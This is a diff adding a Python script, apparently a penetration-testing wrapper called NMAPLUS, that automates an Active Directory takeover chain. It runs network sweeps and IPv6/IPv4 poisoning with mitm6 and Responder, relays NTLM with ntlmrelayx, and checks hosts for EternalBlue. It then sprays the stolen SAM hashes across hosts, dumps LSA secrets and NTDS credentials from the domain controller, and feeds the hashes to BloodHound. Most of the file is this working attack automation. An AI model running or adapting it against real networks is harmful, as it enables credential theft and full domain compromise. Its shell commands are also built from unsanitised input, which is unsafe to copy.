@@ -1,0 +1,850 @@
+#!/usr/bin/env python3
+#-------------------------------------------------------------------------------
+#                                 NMAPLUS
+#               CODED BY: WYATT BECKER | BULLETPROOFSI.COM
+#-------------------------------------------------------------------------------
+
+import os # Command Execution / Path Confirmation
+import argparse # Help menu
+from textwrap import dedent # Just to beautify a couple paragraphs
+import dns.resolver # Find Domain Controller
+from sys import platform # Check the OS being used
+from time import sleep # So the user has time to see what's happening
+from socket import getfqdn  # Get Fully Qualified Domain Name
+from subprocess import check_output # To check and alter commands output and set timeout limits
+
+# WORK FLOW (Subject to Change)
+#----------------
+#1 do pingsweep and output to pingsweep.txt
+#2 clean pingsweep.txt to only be ips and output to alive.txt
+#3 do quick portscan on ips from alive.txt to see which ports are open
+#4 send results to parser to organize into files
+#5 use responder-runFinger for finding win7 boxes (ouput used for second auxiliary FQDN check)
+#6 use cme to generate a relay list of machines with smb signing disabled using 445 file. (ouput used for first auxiliary FQDN check)
+#---
+#7 use mitm6 on the FQDN to create an IPv6 DNS server and then assign an IPv6 address to each host on the IPv4 network.
+#8 use ntlmrelayx.py to perform a proxy authentication attack with WPAD and to relay ntlms to all ips on the relay list
+#--
+# OR
+#--
+#7 start responder to intercept IPv4 requests and poison weak protocols (WPAD, LLMNR, NetBIOS, etc..)
+#8 use ntlmrelayx.py to relay ntlms to all ips on the relay list
+#---
+#9 Do thorough service detection nmap scan
+#10 Check all windows 7 machines for Eternal_Blue(MS17-010) vulnerability > eternally-vuln-ips.txt
+#11 Use EyeWitness to take screenshots of any port on the network with 'http' in it's service name
+#12 Use CME to start spraying DC/AD with passwords obtained from mitm attack (#7 and #8)
+#13 Dump LSA secrets from pwned hosts till DA password found
+#14 Dump entire NTDS credential list from DC.
+#15 Perform nmap vulnerability scan.
+
+#TODO:
+#--------
+#XX add eyewitness function
+#XX add multi relay capabilities for the responder module
+#XX add eternal_blue checker function for win7 hosts.
+#4 add module that attempts to grab CPassword from SYSVOL (preferablly without any user interaction)
+#5 add bloodhound-python function
+#6 add a mechanism similar to linuxes 'script' to log the entire program ouput to a file for later viewing
+#7 add advanced CME functionality
+    #XX.1 backup and replace cme.conf file and make new workspace to store creds (will use --init flag for initial db setup)
+    #XX.2 cat the ntlmrelayx discovered SAM files | grep (-i) for 'admin' | output to file
+    #XX.3 attempt a login on DC with each gathered admin credential (that'll generate a list of cme credential IDs)
+    #XX.4 repeat except on a non DC hosts in order to ensure all creds get put in the DB
+    #XX.5 spray entire scope with each credential ID and dump LSA Secrets and SAMs (Gathers even more IDs)
+    #XX.6 repeat 7.3 with new id list
+    #7.7 repeat 7.5 but with MimiKatz (only good for manual inspection of results)
+    #XX.8 dump NTDS from DC
+    #XX.9 Add option to continue on success
+    #7.10 Add module to check if credential has a password rather than hash to make full use of CredIDs + then can be used in Cpassword search.
+#8 Organize files into more specific directories to be more clean and intuitive
+#9 Add parser options to specify username and password and adapt the code to conform.
+
+#00 Give credit to creators of:
+    #10.1 Autoblue (for eternalblue_checker.py)
+    #10.2 Gnmap-parser (for parsing nmap results to files)
+    #10.3 Impacket (ntlmrelayx)
+    #10.4
+    #10.5
+
+# My appologies for the incredibly unpythonic / sloppy coding, This started as a simple nmap wrapper and I'm not a coder.
+# I littered it with comments to try and make it easier for others to edit on the fly
+
+# HELP MENU
+#------------------
+os.system("figlet NMAPLUS") #Simple command used for bubble letter text
+print("coded by: Wyatt Becker | bulletproofsi.com")
+print()
+sleep(1.5)
+parser = argparse.ArgumentParser(prog='nmaplus',
+      formatter_class=argparse.RawDescriptionHelpFormatter,
+      epilog=dedent('''
+      Additional Information:
+      This program performs nmap scans with various arguments/NSE scripts,
+      parses the results, and packs everything up into various folders.
+      On top of nmap, this program provides a convenient, all-in-one wrapper for
+      all the your important pentest scans (eyewitness, eternal_blue, etc..)
+      Finally, Nmaplus provides the potential for a user to automatically take over
+      an active directory using the programs advanced MitM tactics.
+         '''))
+parser.add_argument('-i', action='store', dest='input',
+                    help="input either a path/to/filename, IP, or Subnet")
+parser.add_argument('-o', '--output-directory', action='store', dest='output_directory',
+                    help='directory to create (default: nmaplus-data/)',type=str)
+parser.add_argument('-p', action='store_true', dest='pingsweep',
+                    help = 'perform a ping sweep')
+parser.add_argument('-q', action='store_true', dest='quickscan',
+                    help = 'perform a quick nmap port scan')
+parser.add_argument('-r', action='store_true', dest='runfinger',
+                    help = 'perform a responder-runFinger scan')
+parser.add_argument('-s', action='store_true', dest='service_detection',
+                    help = 'perform an nmap scan with service detection')
+parser.add_argument('-e', action='store_true', dest='eyewitness',
+                    help = 'perform an eyewitness scan')
+parser.add_argument('-E', action='store_true', dest='eternalcheck',
+                    help = 'checks win7 machines for eternal_blue vulnerability')
+parser.add_argument('-B', action='store_true', dest='bloodhound',
+                    help = 'attempt to gather domain information using bloodhound')
+parser.add_argument('--vuln', action='store_true', dest='vulnscan',
+                    help = 'perform a vulnerability scan using NSE')
+parser.add_argument('--initdb', action='store_true', dest='initdb',
+                    help = 'run once to initialize cme project database')
+parser.add_argument('--mitm6', action='store_true', dest='mitm',
+                    help = 'use this option to perform an IPv6 MitM attack')
+parser.add_argument('--responder', action='store_true', dest='responder',
+                    help = 'use this option to perform an IPv4 MitM attack with responder')
+parser.add_argument('--takeover', action='store_true', dest='takeover',
+                    help = 'use this option to actively attempt to takeover the domain')
+parser.add_argument('--all', action='store_true', dest='all',  # Vuln scan and both mitm attacks not included.
+                    help = 'use this flag to perform all scans excluding vuln (additional flags can be added)')
+parser.add_argument('--overwrite', action='store_true', dest='overwrite',
+                    help = 'use this option ignore overwrite warnings')
+results = parser.parse_args()
+
+# Check for input argument
+if not results.input:
+    parser.print_help() #show helpmenu/syntax
+    print()
+    print("PLEASE USE THE '-i' ARGUMENT.. ")
+    print()
+    exit()
+
+# Initialize variables
+scope_file=""  # If has value, use -iL in initial nmap
+scope=""       # if has value, use raw input in  initial nmap
+write_file=""  # Will be a path sent to file_check() function to check if it exists
+
+# If path to input exists then classify it as a file
+# Else classify it as raw input (single IP or Subnet)
+if os.path.exists(results.input):
+    scope_file=results.input
+else:
+    scope=results.input
+# If output dir specified: add '/' to it, if not, use default dir
+if results.output_directory:
+    path=results.output_directory
+    if not path.endswith("/"): # Just to keep things uniform -
+        path=path+"/" #so we dont get 'path//more-stuff' or 'pathmore-stuff' later on
+else:
+    path="nmaplus-data/"
+
+# Check if output path exists, if so, ask for overwrite.
+if results.overwrite: #If overwrite flag active: skip path existence checks
+    pass
+elif not os.path.exists(path):
+    os.system("mkdir " + path + " 2>/dev/null")
+    print()
+    print("Directory created: " + path)
+    sleep(1)
+else: # Warn of file existence,
+    print("WARNING: You already have a directory named " + path)
+    sleep(1.5)
+#-------------------------------------------------------------------------------
+#  pingSweep()
+#-------------------------------------------------------------------------------
+def pingSweep():
+    print()
+    print(" ---------------------- ")
+    print("| PERFORMING PINGSWEEP |")
+    print(" ----------------------")
+    write_file=path + "pingsweep.txt" # The file we send to file_check function
+    if file_check(write_file) == False: #If file existence comes back as negative/user wants to overwrite:
+        if scope_file==results.input: #  if scope_file != "", we know it's a file being used
+            print("Command: nmap -sn -n -T4 --min-parallelism 100 --max-parallelism 256 --max-rtt-timeout 150ms -e tun0 -iL " + scope_file + " -oG " + path + "pingsweep.txt")
+            print()
+            os.system("nmap -sn -n -T4 --min-parallelism 100 --max-parallelism 256 --max-rtt-timeout 150ms -e tun0 -iL " + scope_file + " -oG " + path + "pingsweep.txt")
+        else: #else assume it's the raw ips/subnets we're dealing with
+            print("Command: nmap -sn -n -T4 --min-parallelism 100 --max-parallelism 256 --max-rtt-timeout 150ms -e tun0 " + scope + " -oG " + path + "pingsweep.txt")
+            print()
+            os.system("nmap -sn -n -T4 --min-parallelism 100 --max-parallelism 256 --max-rtt-timeout 150ms -e tun0 " + scope + " -oG " + path + "pingsweep.txt")
+        print()
+        print("File created: pingsweep.txt") #Nmap output
+        print()
+        sleep(1)
+        print("Cleaning " + path + "pingsweep.txt for a list of alive hosts")
+        print()
+        # Clean the nmap file to only include the IPs and output to new file
+        os.system("cat " + path + "pingsweep.txt |awk {'print $2'} |grep -v Nmap > " + path + "alive.txt")
+        sleep(1)
+        print("File created: alive.txt") # Only the IPs from the pingsweep.txt file
+        sleep(1)
+    else:
+        pass
+#-------------------------------------------------------------------------------
+# portScan()
+#-------------------------------------------------------------------------------
+def portScan():
+    print()
+    print(" ----------------------------")
+    print("| PERFORMING QUICK PORT SCAN |")
+    print(" ----------------------------")
+    write_file=path + "nmap-ports.gnmap"
+    if file_check(write_file) == False:# Don't need scope or scope_file for nmap anymore since we are using alive.txt as an input file
+        print("Command: nmap -T4 -Pn -n --open --max-rtt-timeout 200ms --min-parallelism 100 --max-parallelism 256 -iL " + path + "alive.txt -oG " + path + "nmap-ports.gnmap")
+        print()
+        os.system("nmap -T4 -Pn -n --open --max-rtt-timeout 200ms --min-parallelism 100 --max-parallelism 256 -iL " + path + "alive.txt -oG " + path + "nmap-ports.gnmap")
+        print()
+        print("File creaded: nmap-ports.gnmap")
+        print()
+        sleep(1)
+    else:
+        pass
+#-------------------------------------------------------------------------------
+# parse()
+#-------------------------------------------------------------------------------
+def parse(): # Parses through output of gnmap files and organizes into port folders
+    print()
+    print(" ------------------------------")
+    print("| PARSING THROUGH NMAP RESULTS |")
+    print(" ------------------------------")
+    write_file=path + "port-files"
+    if file_check(write_file) == False: # If no file or overwrite wanted
+        os.system("rm -rf " + path + "parser-extras 2>/dev/null") # Remove files to avoid conflict with 'mv' command
+        os.system("rm -rf " + path + "port-files 2>/dev/null")
+        os.system("cp " + path + "nmap-ports.gnmap .") #to make for easier parser command (We don't have to gather, just parse)
+        print()
+        sleep(1.5)
+        os.system("gnmap-parser.sh -p")
+        os.system("rm nmap-ports.gnmap") # Delete the file copy made earlier
+        sleep(1)
+        print("Done Parsing!")
+        print()
+        os.system("mv Gnmap-Parser/ " + path + "parser-extras") # mv Gnmap-Parser to path/parser-extras
+        print("Directory created: parser-extras/")
+        sleep(1)
+        os.system("mv " + path + "parser-extras/Port-Files " + path + "port-files") # mv the most important parser dir to our output dir for ez access
+        print("File created: port-files")
+        sleep(1)
+    else:
+        pass
+#-------------------------------------------------------------------------------
+# runFinger()
+#-------------------------------------------------------------------------------
+def runFinger():
+    print()
+    print(" ---------------------------")
+    print("| PERFORMING RUNFINGER SCAN |")
+    print(" ---------------------------")
+    print()
+    if port_445_check() == False:  # If function() comes back with no results for port 445
+        return #skip
+    write_file=path + "runfinger.txt"
+    if file_check(write_file) == False:
+        os.system("rm -rf " + path + "windows7-hosts.txt 2>/dev/null")
+        with open(path + '/port-files/Port-445-TCP.txt') as f:
+            try:   # Can take a long time, so added clean exit on KeyboardInterrupt
+                os.system("rm " + write_file + " 2>/dev/null") # if exists, we need to delete since we're appanding with tee
+ # [FIX LATER] DEFINITELY IN NEED OF CHANGING [FIX NEXT]. Use "responder-RunFinger -i 192.168.0.255/24" since "192.168.0.0/24" doesn't work.
+# Instead, We are currently doing 1 IP at a time and showing results after each is done (SLOW!). os.system should work instead of chck_output if method above is used.
+                for line in f:
+                    runfinger_output=check_output("responder-RunFinger -i '" + line.strip('\n') + "' |tee -a "+ write_file,shell=True).decode('utf-8').rstrip()
+                    print(runfinger_output)
+                    if "Windows 7" in runfinger_output:
+                        print() # If "windows 7" in runfinger output: grab only the IP send to textfile
+                        os.system("echo '" + runfinger_output + "'| head -n 1 |awk '{print $4}'|cut -d '.' -f 1,2,3,4 >> " + path + "windows7-hosts.txt")
+            except KeyboardInterrupt:
+                pass
+        os.system("cat " + path + "runfinger.txt |sort -u > runfinger.tmp && mv runfinger.tmp " + path + "runfinger.txt") #Sort for uniques.
+        print("File created: runfinger.txt")
+        sleep(1)
+        print("File created: windows7-hosts.txt")
+        sleep(1)
+        f.close()
+    else: # if no port-445-file
+        pass
+#-------------------------------------------------------------------------------
+# checkEternal()
+#-------------------------------------------------------------------------------
+def checkEternal():
+    print()
+    print(" ------------------------------")
+    print("| PERFORMING ETERNAL_BLUE SCAN |")
+    print(" ------------------------------")
+    write_file=path + "eternally-vuln-ips.txt"
+    if port_445_check() == False:
+        return
+    try:
+        win7_size=os.stat(path + "windows7-hosts.txt").st_size #Check the size of the win7-hosts file
+        if win7_size != 0: # If windows7 file has content:
+            if file_check(write_file) == False:
+                os.system("rm " + write_file + " 2>/dev/null") # Remove file if overwrite wanted
+                e=open(write_file, "a+") # create write file then append to it
+                sleep(1)
+                with open(path + "windows7-hosts.txt") as f:
+                    for ip in f:
+                        print(ip.rstrip() + ": ", end='') #removes '\n'
+                        try: # check if ip is vuln or timeout at .7 sec
+                            check_eternal=check_output("check_eternal " + ip,timeout=1,shell=True).decode("utf-8").rstrip()
+                            if "The target is not patched" in check_eternal:
+                                print("TARGET IS VULNERABLE!")
+                                sleep(1.5)
+                            else:
+                                print("target not vunerable")
+                        except KeyboardInterrupt:
+                            break
+                        except:
+                            f.readline() # if it timesout, go to next ip in file
+                    print()
+                    print("File created: eternally-vuln-ips.txt")
+                    sleep(1)
+    except: # If can't os.stat windows7-hosts.txt
+        print("No Windows 7 Hosts Found...")
+#-------------------------------------------------------------------------------
+# gen_relay_list()
+#-------------------------------------------------------------------------------
+def gen_relay_list():
+    print()
+    print(" -----------------------")
+    print("| GENERATING RELAY LIST |")
+    print(" -----------------------")
+    print()
+    if port_445_check() == False:
+        return
+    write_file=path+"relay_list.txt"
+    if file_check(write_file) == False:
+        if scope==results.input:
+            # cme will only write the ips without smb signing to file. This file will be use as the targets list for ntlmrelayx()
+                # I'm also teeing all ouput to a second file. This file will be grepped through for the first auxiliary fqdn check
+            print("Command: cme -t 256 --timeout 1 smb " + scope + " --gen-relay-list '" + write_file + "' | tee " + path + "cme_relay_output.txt")
+            try: #for clean exit if / when it hangs
+                os.system("cme -t 256 --timeout 1 smb " + scope + " --gen-relay-list '" + write_file + "' | tee " + path + "cme_relay_output.txt")
+            except KeyboardInterrupt:
+                pass
+        elif scope_file==results.input: # if a file was entered as input rather than raw subnet/ip:
+            print("Command: cme -t 256 --timeout 1 smb " + scope_file + " --gen-relay-list '" + write_file + "' | tee " + path + "cme_relay_output.txt")
+#            try: #for clean exit if / when it hangs
+            os.system("cme -t 256 --timeout 1 smb " + scope_file + " --gen-relay-list '" + write_file + "' | tee " + path + "cme_relay_output.txt")
+#            except KeyboardInterrupt:
+#                pass
+        print()
+        sleep(1)
+        os.system("cat " + write_file + " |sort -u > relay_list.tmp; mv relay_list.tmp " + write_file) # get rid of duplicate results
+        print("File created: relay_list.txt")
+        sleep(1)
+    else:
+        pass
+#-------------------------------------------------------------------------------
+# get_fqdn()
+#-------------------------------------------------------------------------------
+# Try to grab fqdn from socket, else grab from cme output, else from runfinger output, else have user type it manually
+    # Three seems like too many automated guesses. Will probably remove one later
+def get_fqdn():
+    print("Grabbing FQDN... (Fully Qualified Domain Name)")
+    try:
+        f=open(path + 'relay_list.txt')
+        fqdn_target = f.readline().rstrip() # grab the first ip in relay_list.txt as a target
+        fqdn=getfqdn(fqdn_target) # try to get fqdn of from socket
+        if check_fqdn(fqdn) == True: # ask if fqdn is correct, if it is it, return fqdn
+            return(fqdn)
+    except KeyboardInterrupt: # It can hang for a bit
+        pass
+    # Check first line of cleaned cme_relay_output.txt for fqdn
+    fqdn=check_output("cat "+ path + "cme_relay_output.txt | head -n 1| cut -d ':' -f 3 | cut -d ')' -f 1", shell=True).decode("utf-8").rstrip()
+    # verify that fqdn is correct else try again with runfinger output
+    if check_fqdn(fqdn) == True:
+        return(fqdn)
+    fqdn=check_output("cat "+ path + "runfinger.txt|grep domain |head -n 1 |cut -d \"'\" -f 2",shell=True).decode("utf-8").rstrip()
+    # verify that fqdn is correct else get user input
+    if check_fqdn(fqdn) == True:
+        return(fqdn)
+    print()
+    print("UNABLE TO GRAB FQDN :(")
+    sleep(.5)
+    fqdn=input("Please manually input the target's FQDN: ")
+    return fqdn
+#-------------------------------------------------------------------------------
+# check_fqdn()
+#-------------------------------------------------------------------------------
+def check_fqdn(fqdn): #just to shorten the code bit
+    print()
+    check=input("Is '" + str(fqdn) + "' the correct FQDN (y/N): ")
+    if check.lower().rstrip() == 'y':
+        return True
+
+#-------------------------------------------------------------------------------
+# port_445_check()
+#-------------------------------------------------------------------------------
+# Checks for file existance
+def port_445_check(): # Just to shorten up the overall code a bit
+    if not os.path.exists(path + '/port-files/Port-445-TCP.txt'):
+        print("No machines came back as having port 445 open :(")
+        sleep(1.5)
+        return False
+    return True
+
+#-------------------------------------------------------------------------------
+# file_check()
+#-------------------------------------------------------------------------------
+def file_check(write_file): #Checks if file exists and gives option to overwrite
+    if results.overwrite: # if overwrite flag: assume the write_file doesn't exist
+        return False
+    if os.path.exists(write_file):
+        print('WARNING: ' + write_file + " already exists.")
+        print()
+        overwrite=input("do you want to overwrite? (y/N): ")
+        if overwrite == "y" or overwrite == "Y":
+            return False
+        else:
+            print()
+            print("Skipping Task...")
+            sleep(.3)
+            return True
+    else:
+        return False
+#-------------------------------------------------------------------------------
+# mitm6()
+#-------------------------------------------------------------------------------
+def mitm6():
+    print()
+    print(" -----------------------------")
+    print("| PERFORMING IPv6 MITM ATTACK |")
+    print(" -----------------------------")
+    print()
+    if port_445_check() == False:
+        return
+    fqdn=get_fqdn()
+    print("Command: gnome-terminal -- mitm6 -i " + fqdn)
+    print()
+    print("Starting mitm6 on " + fqdn)
+    sleep(1)
+    os.system("gnome-terminal -- mitm6 -d " + fqdn)
+    print()
+    print("hint: it'd be a good time to start PCredz on OS X ;)")
+    sleep(2)
+    ntlmrelayx(fqdn) # put the funciton call here because it's only needed in mitm attacks
+    return fqdn
+#-------------------------------------------------------------------------------
+# ntlmrelayx()
+#-------------------------------------------------------------------------------
+def ntlmrelayx(fqdn):
+    print()
+    print(" -------------------------------")
+    print("| PERFORMING NTLM RELAY ATTACK  |")
+    print(" -------------------------------")
+    # Currently, two different scans are used depending on which MITM method you're using. This may change
+    os.system("mkdir ntlms 2>/dev/null") #ensure necessary folders exist
+    os.system("mkdir sams 2>/dev/null")
+    if not fqdn == "RESPONDER": # If this function wasn't called from the responder function:
+        print("Command: gnome-terminal -- ntlmrelayx.py -6 -wh gli." + fqdn + " -tf " + path + "relay_list.txt -l sams/' -of ntlms/hashes.txt")
+        sleep(1) # -6=ipv6, -wh=wpad host, -tf=targets file, -l=loot dir, -of=output file
+        os.system("gnome-terminal -- ntlmrelayx.py -6 -wh gli." + fqdn + " -tf " + path + "relay_list.txt -l 'sams/' -of ntlms/hashes.txt")
+        sleep(1)
+    else: # Same command except without the WPAD or IPv6 arguments
+        print("Command: gnome-terminal -- ntlmrelayx.py -tf " + path + "relay_list.txt -l 'sams/' -of ntlms/hashes.txt")
+        sleep(1)
+        os.system("gnome-terminal -- ntlmrelayx.py -tf " + path + "relay_list.txt -l 'sams/' -of ntlms/hashes.txt")
+        sleep(1)
+    print()
+    print("Directory created: ntlms/")
+    sleep(1)
+    print("Directory created: sams/")
+    sleep(1)
+#-------------------------------------------------------------------------------
+# responder()
+#-------------------------------------------------------------------------------
+def responder():
+    print()
+    print(" -----------------------------")
+    print("| PERFORMING IPv4 MITM ATTACK |")
+    print(" -----------------------------")
+    print()
+    if port_445_check() == False:
+        return
+    flag="RESPONDER" # This is going to be sent to ntlmrelayx() to tell it to do the variant command
+    sleep(1) # Make backup of responder.conf
+    os.system("cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak")
+    print("Backup created: Responder.conf.bak")
+    sleep(1) # Replace current responder.conf file with the one from resources
+    os.system("cp ~/.nmaplus/resources/Responder.conf /etc/responder/Responder.conf")
+    print("File created: Responder.conf")
+    print()
+    sleep(1) #Execute the Command
+    print("Command: gnome-terminal -- responder -I eth0 -r -d -w")
+    # Without ntlmrelayx the command I'd normally use is: responder -FfwPrbd --lm (Still might [FIX LATER], more testing needed)
+    sleep(1)
+    os.system("gnome-terminal -- responder -I eth0 FwPrbd --lm")
+    sleep(2)
+    print() # Restore responder.conf to its former state
+    os.system("mv /etc/responder/Responder.conf.bak /etc/responder/Responder.conf")
+    print("File restored: Responder.conf")
+    sleep(1)
+    ntlmrelayx(flag) # Call ntlmrelayx function and send "RESPONDER" as the fqdn
+
+#-------------------------------------------------------------------------------
+# findDC(fqdn)
+#-------------------------------------------------------------------------------
+def findDC(fqdn):
+    # IDEA for Precaution: Instead of only taking first DC. Iterate through DC results asking if user thinks result is DC [FIX LATER]
+    DC="nothing" # Used as a flag to only take the first DNS Recieved
+    domain = fqdn
+    answers = dns.resolver.query(domain,'NS') # Do an nslookup to find nameservers
+    for server in answers:
+        if not DC == "nothing": # If DC has already been given a value once:
+            pass
+        else:
+            DC=server.target
+            DC=str(DC).rstrip()
+            DC=DC[:-1] # Remove the last '.' from output
+            return DC
+#-------------------------------------------------------------------------------
+# auto_cme()
+#-------------------------------------------------------------------------------
+def autoCME(DC,fqdn):
+    print()
+    print(" ---------------------")
+    print("| AUTO CRACK MAP EXEC |")
+    print(" ---------------------")
+    creds_dict={} # This will be a dictionary containing our hash:usernames as key:values. (hash is the key since it will be unique)
+    #-------------
+    # samRefresh()
+    #-------------
+    def samRefresh(): # This is used to keep refreshing list of sams
+        print("Refreshing SAM file.. ")
+        sleep(1)
+        os.system("cat sams/*.sam |grep -i admin |cut -d ':' -f 1,4 |sort -u |grep ':' > sams/merged.tmp") # merge all sam files into one sort unique.
+        os.system("cat sams/merged.tmp | sort -u > sams/merged.txt && rm sams/merged.tmp") # extra sort since i'm getting weird file behavior.
+    #----------
+    # initDB()
+    #----------
+    def initDB():
+        print()
+        print("Initializing DB Workspace...")
+        sleep(1)
+        write_file="/root/.cme/workspaces/" + fqdn.rstrip()
+        if file_check(write_file) == False:
+            if os.path.exists(write_file): # If DB Workspace already found
+                print()
+                print("YOU ARE ABOUT TO ERASE ALL CREDENTIALS FROM YOUR DB...")  # Since you only should have to init once per project...
+                double_check=input("Are you sure you want to do this? (y/N): ")     # Double check that an overwrite is really wanted
+                if not double_check.lower().rstrip() == "y": #if they don't want a db overwrite:
+                    print()
+                    print("Skipping DB Reinitialization...")
+                    print("Close One ;)")
+                    sleep(1)
+                    return
+            os.system("mkdir ~/.cme/workspaces/" + fqdn.rstrip() + " 2>/dev/null") #Create workspace named after the FQDN
+            os.system("cp ~/.cme/cme.conf ~/.cme/cme.conf.bak 2>/dev/null") # Create conf backup
+            # Will run into problems retaining original config if this module is ran twice [FIX LATER]
+            print("Backup created: cmedb.conf.bak")
+            print()
+            sleep(1)
+            os.system("echo '[CME]' > tmp.conf") # Adding first Line (The Header) to what will be our conf file
+            os.system("echo 'workspace = " + fqdn.rstrip() + "' >> tmp.conf") # Adding second line defining workspace name
+            os.system("cat ~/.nmaplus/resources/nmaplusdb/cmedb.conf >> tmp.conf ") # Cat in the rest of the lines from the cmedb.conf in resources
+            os.system("cat tmp.conf > ~/.cme/cme.conf") #and overwrite current configs
+            print("Database created: " + fqdn)
+            # Now Copy all the databases from resources to our workspace
+            os.system("cp -r ~/.nmaplus/resources/nmaplusdb/* ~/.cme/workspaces/" + fqdn.rstrip() + "/.")
+            sleep(1)
+    #--------
+    # pwnDC()
+    #--------
+    def pwnDC(DC,fqdn):
+        samRefresh()
+        print()
+        firstCredFlag=0 # Used to send only the first admin creds to bloodhound module
+        # Idea: Instead of getting each individual user:hash think about using usernames.txt and passwords.txt (hasn't been tested)
+        with open("sams/merged.txt") as f:
+            for line in f:
+                credential=line.rstrip().split(":") # List of single Username:Hash split into two different slots
+                key=credential[1].strip() # key==hash in username:hash
+                value=credential[0].strip() # value==username in username:hash
+                creds_dict[key]=value # add key:values to dict
+        try: # Used to allow user to break out of loop if desired (try statements need work for cleaner breaks)
+            print("Testing SAM Creds Against the DC...")
+            sleep(2)
+            for hash,user in creds_dict.items():
+                print(user + ":" + hash)
+                try: #Some hang, if they do, go to next hash
+                    DAoutput=check_output("cme smb " + DC + " -u " + user + " -H " + hash + " 2>/dev/null",shell=True).decode("utf-8").rstrip()
+                    print(DAoutput)
+                    sleep(1)
+                    # IF DA IS FOUND
+                    if 'Pwn3d' in DAoutput:
+                        print()
+                        print("DOMAIN ADMINISTRATOR FOUND: ",end='')
+                        DA=(user + ":" + hash)
+                        print(DA)
+                        os.system("echo " + DA + " > " + path + "DAPass.txt")
+                        sleep(3)
+                        print()
+                        print("Using DA to Dump all Domain Credentials from DC...")
+                        sleep(1)
+                        os.system("cme smb " + DC + " -u " + user + " -H " + hash + " --ntds |tee ADCreds.txt")
+                        print("File created: ADCreds.txt")
+                        sleep(1)
+                except: # For addresses that are found that aren't alive anymore or something. gets a bunch of random errors
+                    pass
+        except KeyboardInterrupt:
+            pass
+        # Spray AD with each cred, if pwn3d in output, send credential to bloodhound module and add one to flag
+        samRefresh()
+        # IDEA: MAKE BELOW A PWNAD() FUNCTION AND GIVE OPTION TO CALL IT IF DA FOUND DURING PWNDC(). otherwise it automatically moves on to PWNAD attempt
+        print()
+        print("Spraying AD with SAM Creds...")
+        sleep(1)
+        for hash,user in creds_dict.items():
+            print(user + ":" + hash)
+            ADoutput=check_output("cme smb " + path + "port-files/Port-445-TCP.txt -u " + user + " -H " + hash + " --sam --lsa 2>/dev/null", shell=True).decode("utf-8").rstrip()
+            print(ADoutput)
+            print()
+            if 'Pwn3d' in ADoutput and firstCredFlag==0: # If It's the first pwn3d machine, Send to bloodhound
+                print(user + " has administrator privs on at least one machine...")
+                sleep(1)
+                print("Sending Credentials to Bloodhound")
+                sleep(3)
+                bloodhound(user,hash,fqdn,DC)
+                firstCredFlag+=1
+        # After all SAM creds tested against DC and AD..
+        # Refresh SAMs and test CredIDs against DC.
+        samRefresh()
+        # Finally, try all cred IDs on DC while attempting to do an ntds dump.
+        # currently no way to check which cred is the DA if it's found at this point. Could be solved looping through IDs 1by1 or grepping from output
+        print("Spraying DC using CredIDs")
+        sleep(1)
+        os.system("cme smb " + DC + " -id all --ntds 2>/dev/null")
+        # The below could be added in order to potentially generate more credIDs
+        #print("Spraying AD using CredIDs")
+        #sleep(1)
+        #os.system("cme smb " + path + "port-files/Port-445-TCP.txt -id all --sam --lsa 2>/dev/null")
+        f.close()
+
+# Ideally, i'd like to remove checked creds from merged.txt to speed things up.
+# idea: read merged.txt backwards to do the new hashes first and possibly limit output
+
+
+    # Function Calls
+    #-----------
+    if results.initdb: # If initdb flag: call init function
+        initDB()
+    flag=1
+    while flag<=3: # Loop function calls while flag <=3 or DA found
+        print()
+        print("Attempt " + str(flag) + ": ")
+        sleep(1)
+        if os.path.exists(path + "DAPass.txt"): # If DA Password already found
+            print()
+            print("DA Creds Already Found: ", end="")
+            with open(path + "DAPass.txt") as f:
+                print(f.read())
+            sleep(1)
+            ignoreDA=input("Do you want to continue anyway for testing purposes? (Y/n): ") #ask if you should stop after finding DA.
+            if ignoreDA.lower().rstrip()=="n":
+                print("Skipping further attacks against the DC...")
+                return
+        DA=pwnDC(DC,fqdn) # Else try to pwn DC then spray AD
+        flag += 1
+        if flag>3:
+            print()
+            print("DA Couldn't be found at this time. Try again after more mitm creds are found...")
+            retry=input("Do you want to retry? (Y/n): ")
+            if retry.lower().rstrip()=="n":
+                print("Moving on...")
+                sleep(2)
+            else:
+                print("Rerunning Module")
+                sleep(2)
+                autoCME(DC,fqdn)
+#-------------------------------------------------------------------------------
+# bloodhound()
+#-------------------------------------------------------------------------------
+#BLOODHOUND NEEDS HASHES TO BE FULL LM:NTLM FORM. (saving the hashes to adcreds.)
+# Current Temporary fix - adding fake hash: before :real hash.
+# For the real fix I'll just have to clean hash results earlier to include the first portion of the hash as well. [FIX LATER]
+def bloodhound(user, hash, fqdn, DC):
+    print()
+    print(" ---------------------------")
+    print("| GATHERING BLOODHOUND CSVs |")
+    print(" ---------------------------")
+    write_file=path + "bloodhound/"
+    if file_check(write_file) == False:
+        os.system("mkdir " + path + "bloodhound/ 2>/dev/null")
+        os.system("python3 ~/.nmaplus/resources/bloodhound-python/bloodhound.py -c All -u " + user + " --hashes " + "aad3b435b51404eeaad3b435b51404ee:" + hash + " -d " + fqdn + " -dc " + DC)
+        os.system("mv *.json " + path + "bloodhound/. 2>/dev/null")
+        sleep(2)
+        #python3 bloodhound.py -c All -u Administrator -H hash -d fqdn -dc DC (& ?)
+
+#-------------------------------------------------------------------------------
+# eyeWintness()
+#-------------------------------------------------------------------------------
+def eyeWitness():
+    print()
+    print(" ----------------------------")
+    print("| PERFORMING EYEWITNESS SCAN |")
+    print(" ----------------------------")
+    write_file=path + "http-ports.txt"
+    port_list=[] # Used to put all http ports in a list which will later be joined with a ", "
+    ports="" # will be a string used in eyewitness command containing all the http-ports to try
+    if file_check(write_file) == False:
+        #------------------------
+        # Gather and prepare data
+        #------------------------
+        # Theres probs an easier to get all http IPs but this will work for now.
+        # Find all the ports that have http in the service name, sort, write port numbers to file, copy file to eyewitness dir
+        # It's thorough but will come back with some non http ports too causing the execution to take much longer
+        os.system("cat " + path + "nmap-services.txt |grep -i http |grep '/tcp' |sort -nu |cut -d '/' -f 1 > " + path + "http-ports.txt")
+        f=open(path + "http-ports.txt") # Open file containing port numbers
+        k=open(path + "http-ips.txt", "a+") # Touch file that will hold our http IPs
+        for line in f: # For port number in portnumbers file:
+            port = line.rstrip()
+            port_list.append(port) #Appending port to the list
+            try: # Open file by port number to get ips associated with each
+                with open(path + "port-files/Port-" + str(port) + "-TCP.txt") as e:
+                    for ip in e: #for each IP in the port file containing IPs
+                        k.write(ip) # Append IP to http-ips.txt
+            except:
+                pass
+        ports=', '.join(port_list) # Take ports from list[], append ', ' to each excluding the last and add to string.
+        k.close()
+        f.close()
+        os.system("cat " + path + "http-ips.txt |sort -n |sort -u > tmp && mv tmp " + path + "http-ips.txt") #Sort by number and get ride of duplicates
